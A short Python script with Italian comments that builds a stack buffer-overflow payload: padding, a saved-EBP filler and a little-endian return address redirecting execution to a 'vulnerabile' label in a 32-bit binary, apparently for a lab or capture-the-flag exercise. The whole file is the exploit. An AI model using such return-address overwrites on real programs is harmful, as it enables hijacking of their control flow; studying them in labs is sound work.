import struct

# 16 byte per il buffer + 4 per il vecchio EBP
padding = b"A" * 16
junk = b"B" * 4

# Sostituisci questo con l'indirizzo della label "vulnerabile" dal binario assembly
# Ottienilo con: objdump -d file | grep vulnerabile
# Esempio: 0804906d
ret_address = struct.pack("<I", 0x0804906d)  # <- cambia questo valore!

# Costruzione del payload
payload = padding + junk + ret_address

# Scrittura su file
with open("payload", "wb") as f:
    f.write(payload)

print("Payload creato in 'payload'")
